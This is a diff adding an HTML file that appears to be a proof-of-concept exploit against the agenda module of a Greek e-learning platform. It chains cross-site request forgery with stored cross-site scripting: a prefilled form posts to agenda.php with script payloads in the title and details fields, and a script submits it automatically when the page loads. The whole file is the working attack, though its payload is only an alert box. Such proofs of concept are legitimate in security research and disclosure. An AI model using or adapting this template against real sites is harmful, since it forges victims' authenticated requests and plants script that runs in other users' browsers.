@@ -1,0 +1,61 @@
+
+ <form id='csrf_form' action='http://Eponymous.csec.gr/modules/agenda/agenda.php' method='post'>
+
+    <input type='hidden' name='id' value='0' />
+    <table width='99%' class='FormData'>
+    <tbody>
+    <tr>
+      <th class='left' width='150'>&nbsp;</th>
+      <td><b>Προσθήκη ενός γεγονότος</b><td>
+      </tr>
+      <tr><th class='left'>Τίτλος:</th>
+			<td><input type='text' size='85' name='titre' value="<script>alert('xss')</script>" class='FormData_InputText' /></td>
+			</tr>
+			<tr>
+			<th class='left' rowspan='2'>Επιλογές:</th>
+			<td>Ημερομηνία: <input style="width: 8em; color: #727266; background-color: #fbfbfb; border: 1px solid #C0C0C0; text-align: center" name="date" value="2018-4-18" id="f-calendar-field-1" type="text" /><a href="#" id="f-calendar-trigger-1"><img align="middle" border="0" src="http://eponymous.csec.gr/include/jscalendar/img.gif" alt="" /></a><script type="text/javascript">Calendar.setup({"ifFormat": "%Y-%m-%d","daFormat": "%Y/%m/%d","showOthers":true,"align": "Tl","inputField": "f-calendar-field-1","button": "f-calendar-trigger-1"});</script></td>
+			</tr>
+			<tr>
+		<td>Ώρα: <select name='fhour' class='auth_input'>
+				<option value='15'>15</option>
+				<option value='--'>--</option>
+<option value='0'>0</option>
+<option value='1'>1</option>
+<option value='2'>2</option>
+<option value='3'>3</option>
+<option value='4'>4</option>
+<option value='5'>5</option>
+<option value='6'>6</option>
+<option value='7'>7</option>
+<option value='8'>8</option>
+<option value='9'>9</option>
+<option value='10'>10</option>
+<option value='11'>11</option>
+<option value='12'>12</option>
+<option value='13'>13</option>
+<option value='14'>14</option>
+<option value='15'>15</option>
+<option value='16'>16</option>
+<option value='17'>17</option>
+<option value='18'>18</option>
+<option value='19'>19</option>
+<option value='20'>20</option>
+<option value='21'>21</option>
+<option value='22'>22</option>
+<option value='23'>23</option>
+<option value='24'>24</option></select>&nbsp;&nbsp;&nbsp;&nbsp;Λεπτά: <select name='fminute' class='auth_input'>
+			<option value='29'>[29]</option>
+			<option value='--'>--</option><option value='0'>0</option><option value='5'>5</option><option value='10'>10</option><option value='15'>15</option><option value='20'>20</option><option value='25'>25</option><option value='30'>30</option><option value='35'>35</option><option value='40'>40</option><option value='45'>45</option><option value='50'>50</option><option value='55'>55</option></select>&nbsp;&nbsp;&nbsp;&nbsp;Διάρκεια (σε ώρες):
+			<input class='FormData_InputText' type='text' name='lasting' value='' size='2' maxlength='2' /></td>
+    			</tr><tr><th class='left'>Λεπτομέρειες:</th>
+			<td><textarea id='xinha' name='contenu' value="<script>alert('xss')</script>"></textarea></td>
+			</tr>
+			<tr><th class='left'>&nbsp;</th>
+			<td><input type='text' name='submit' value='Προσθήκη / Αλλαγή' /></td>
+			</tr></tbody></table>
+
+  </form>
+<script>
+    var form = document.querySelector("#csrf_form");
+    HTMLFormElement.prototype.submit.call(form);
+</script>
